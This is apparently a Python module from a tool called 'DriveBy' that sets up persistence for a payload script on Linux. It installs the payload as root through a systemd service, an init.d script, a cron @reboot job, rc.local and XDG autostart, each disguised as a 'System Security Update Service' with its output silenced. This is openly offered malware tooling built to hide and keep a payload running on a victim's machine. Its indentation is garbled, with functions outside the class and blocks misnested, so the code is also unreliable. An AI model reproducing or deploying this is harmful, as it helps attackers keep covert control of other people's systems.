#!/usr/bin/env python3
"""
Linux Persistence Module
Ensures DriveBy monitoring processes restart after shutdown/restart
"""

import os
import sys
import subprocess
import tempfile
import shutil
from pathlib import Path

class LinuxPersistence:
    def __init__(self):
        self.script_path = Path(__file__).parent.parent / "payloads" / "linux_monitor.py"
        self.service_name = "system-security-update"

    def create_systemd_service(self):
        """Create systemd service for persistence"""
        try:
            service_content = f'''[Unit]
            Description=System Security Update Service
            After=network.target
            Wants=network.target

            [Service]
            Type=simple
            ExecStart=/usr/bin/python3 {self.script_path}
            Restart=always
            RestartSec=30
            User=root
            Group=root
            StandardOutput=null
            StandardError=null

            [Install]
            WantedBy=multi-user.target
            '''

            service_file = f"/etc/systemd/system/{self.service_name}.service"

            # Write service file
            with open(service_file, 'w') as f:
                f.write(service_content)

                # Reload systemd and enable service
                subprocess.run(['systemctl', 'daemon-reload'], check=True)
                subprocess.run(['systemctl', 'enable', self.service_name], check=True)
                subprocess.run(['systemctl', 'start', self.service_name], check=True)

                print(" Systemd service persistence created")
                return True

        except subprocess.CalledProcessError as e:
                print(f" Systemd service failed: {e}")
                return False
        except Exception as e:
                print(f" Systemd service persistence failed: {e}")
                return False

def create_init_d_service(self):
    """Create init.d service for older systems"""
    try:
        init_script = f'''#!/bin/bash
        ### BEGIN INIT INFO
        # Provides: {self.service_name}
        # Required-Start: $network $local_fs $remote_fs
        # Required-Stop: $network $local_fs $remote_fs
        # Default-Start: 2 3 4 5
        # Default-Stop: 0 1 6
        # Short-Description: System Security Update Service
        # Description: System Security Update Service
        ### END INIT INFO

        DAEMON_NAME="{self.service_name}"
        DAEMON_USER="root"
        DAEMON_PATH="/usr/bin/python3"
        DAEMON_OPTS="{self.script_path}"
        DAEMON_DESC="System Security Update Service"

        PIDFILE="/var/run/$DAEMON_NAME.pid"
        SCRIPTNAME="/etc/init.d/$DAEMON_NAME"

        case "$1" in
        start)
        printf "%-50s" "Starting $DAEMON_NAME: "
        PID=`$DAEMON_PATH $DAEMON_OPTS > /dev/null 2>&1 & echo $!`
        if [ -z $PID ]; then
        printf "%s\\n" "Fail"
        else
        echo $PID > $PIDFILE
        printf "%s\\n" "Ok"
        fi
        ;;
        status)
        printf "%-50s" "Checking $DAEMON_NAME: "
        if [ -f $PIDFILE ]; then
        PID=`cat $PIDFILE`
        if [ -z "`ps axf | grep ${{PID}} | grep -v grep`" ]; then
        printf "%s\\n" "Process dead but pidfile exists"
        else
        echo "Running"
        fi
        else
        printf "%s\\n" "Service not running"
        fi
        ;;
        stop)
        printf "%-50s" "Shutting down $DAEMON_NAME: "
        PID=`cat $PIDFILE`
        if [ -f $PIDFILE ]; then
        kill -HUP $PID
        printf "%s\\n" "Ok"
        rm -f $PIDFILE
        else
        printf "%s\\n" "pidfile not found"
        fi
        ;;

        restart)
        $0 stop
        $0 start
        ;;

        *)
        echo "Usage: $0 {{start|stop|status|restart}}"
        exit 1
        ;;

        esac

        exit 0
        '''

        init_file = f"/etc/init.d/{self.service_name}"

        # Write init script
        with open(init_file, 'w') as f:
            f.write(init_script)

            # Make executable
            os.chmod(init_file, 0o755)

            # Enable service
            subprocess.run(['update-rc.d', self.service_name, 'defaults'], check=True)
            subprocess.run(['service', self.service_name, 'start'], check=True)

            print(" Init.d service persistence created")
            return True

    except Exception as e:
            print(f" Init.d service persistence failed: {e}")
            return False

def create_cron_persistence(self):
    """Create cron job for persistence"""
    try:
        # Create wrapper script
        wrapper_script = self.create_cron_wrapper()

        # Add to root crontab
        cron_entry = f"@reboot {wrapper_script}\n"

        # Get current crontab
        try:
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_cron = result.stdout if result.returncode == 0 else ""
        except:
            current_cron = ""

            # Add our entry if not already present
            if wrapper_script not in current_cron:
                new_cron = current_cron + cron_entry

                # Write new crontab
                process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
                process.communicate(input=new_cron)

                if process.returncode == 0:
                    print(" Cron persistence created")
                    return True
                else:
                    print(" Cron persistence already exists")
                    return True

        except Exception as e:
                    print(f" Cron persistence failed: {e}")
                    return False

def create_rc_local_persistence(self):
    """Create rc.local persistence"""
    try:
        rc_local_path = "/etc/rc.local"
        wrapper_script = self.create_rc_wrapper()

        # Create rc.local if it doesn't exist
        if not os.path.exists(rc_local_path):
            with open(rc_local_path, 'w') as f:
                f.write("#!/bin/bash\n")
                os.chmod(rc_local_path, 0o755)

                # Read current rc.local
                with open(rc_local_path, 'r') as f:
                    content = f.read()

                    # Add our script if not already present
                    if wrapper_script not in content:
                        # Insert before exit 0 if present, otherwise append
                        if "exit 0" in content:
                            content = content.replace("exit 0", f"{wrapper_script} &\nexit 0")
                        else:
                            content += f"\n{wrapper_script} &\n"

                            # Write updated rc.local
                            with open(rc_local_path, 'w') as f:
                                f.write(content)

                                print(" rc.local persistence created")
                                return True
                            else:
                                print(" rc.local persistence already exists")
                                return True

    except Exception as e:
                                print(f" rc.local persistence failed: {e}")
                                return False

def create_autostart_persistence(self):
    """Create XDG autostart persistence"""
    try:
        # Create autostart directory
        autostart_dir = Path.home() / ".config" / "autostart"
        autostart_dir.mkdir(parents=True, exist_ok=True)

        # Create desktop file
        desktop_content = f'''[Desktop Entry]
        Type=Application
        Name=System Security Update
        Exec=python3 {self.script_path}
        Hidden=false
        NoDisplay=false
        X-GNOME-Autostart-enabled=true
        '''

        desktop_file = autostart_dir / "system-security-update.desktop"
        with open(desktop_file, 'w') as f:
            f.write(desktop_content)

            print(" XDG autostart persistence created")
            return True

    except Exception as e:
            print(f" XDG autostart persistence failed: {e}")
            return False

def create_cron_wrapper(self):
    """Create cron wrapper script"""
    wrapper_content = f'''#!/bin/bash
    cd "{Path(__file__).parent.parent}"

    while true; do
    python3 "{self.script_path}" > /dev/null 2>&1
    sleep 30
    done
    '''

    wrapper_path = "/tmp/system_security_wrapper.sh"
    with open(wrapper_path, 'w') as f:
        f.write(wrapper_content)

        os.chmod(wrapper_path, 0o755)
        return wrapper_path

def create_rc_wrapper(self):
    """Create rc.local wrapper script"""
    wrapper_content = f'''#!/bin/bash
    cd "{Path(__file__).parent.parent}"
    nohup python3 "{self.script_path}" > /dev/null 2>&1 &
    '''

    wrapper_path = "/tmp/system_security_rc.sh"
    with open(wrapper_path, 'w') as f:
        f.write(wrapper_content)

        os.chmod(wrapper_path, 0o755)
        return wrapper_path

def install_all_persistence(self):
    """Install all persistence mechanisms"""
    results = []

    print(" Installing Linux persistence mechanisms...")

    # Try systemd service (modern systems)
    if shutil.which('systemctl'):
        results.append(self.create_systemd_service())

        # Try init.d service (older systems)
    elif os.path.exists('/etc/init.d'):
        results.append(self.create_init_d_service())

        # Try cron persistence
        if shutil.which('crontab'):
            results.append(self.create_cron_persistence())

            # Try rc.local persistence
            results.append(self.create_rc_local_persistence())

            # Try XDG autostart (user session)
            results.append(self.create_autostart_persistence())

            successful = sum(results)
            print(f" Linux persistence: {successful}/{len(results)} methods installed")

            return successful > 0

def remove_persistence(self):
    """Remove all persistence mechanisms"""
    try:
        # Remove systemd service
        try:
            subprocess.run(['systemctl', 'stop', self.service_name], capture_output=True)
            subprocess.run(['systemctl', 'disable', self.service_name], capture_output=True)
            os.remove(f"/etc/systemd/system/{self.service_name}.service")
            subprocess.run(['systemctl', 'daemon-reload'], capture_output=True)
        except:
            pass

            # Remove init.d service
            try:
                subprocess.run(['service', self.service_name, 'stop'], capture_output=True)
                subprocess.run(['update-rc.d', self.service_name, 'remove'], capture_output=True)
                os.remove(f"/etc/init.d/{self.service_name}")
            except:
                pass

                # Remove cron entry
                try:
                    result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
                    if result.returncode == 0:
                        lines = result.stdout.split('\n')
                        filtered_lines = [line for line in lines if 'system_security_wrapper' not in line]
                        new_cron = '\n'.join(filtered_lines)

                        process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
                        process.communicate(input=new_cron)
                except:
                        pass

                        # Remove rc.local entry
                        try:
                            rc_local_path = "/etc/rc.local"
                            if os.path.exists(rc_local_path):
                                with open(rc_local_path, 'r') as f:
                                    content = f.read()

                                    lines = content.split('\n')
                                    filtered_lines = [line for line in lines if 'system_security_rc' not in line]
                                    new_content = '\n'.join(filtered_lines)

                                    with open(rc_local_path, 'w') as f:
                                        f.write(new_content)
                        except:
                                        pass

                                        # Remove XDG autostart
                                        try:
                                            desktop_file = Path.home() / ".config" / "autostart" / "system-security-update.desktop"
                                            if desktop_file.exists():
                                                desktop_file.unlink()
                                        except:
                                                pass

                                                # Remove wrapper scripts
                                                for wrapper in ["/tmp/system_security_wrapper.sh", "/tmp/system_security_rc.sh"]:
                                                    try:
                                                        os.remove(wrapper)
                                                    except:
                                                        pass

                                                        print(" Linux persistence removed")
                                                        return True

                                                    except Exception as e:
                                                        print(f" Error removing persistence: {e}")
                                                        return False

                                                        if __name__ == "__main__":
                                                            persistence = LinuxPersistence()

                                                            if len(sys.argv) > 1 and sys.argv[1] == "remove":
                                                                persistence.remove_persistence()
                                                            else:
                                                                persistence.install_all_persistence()
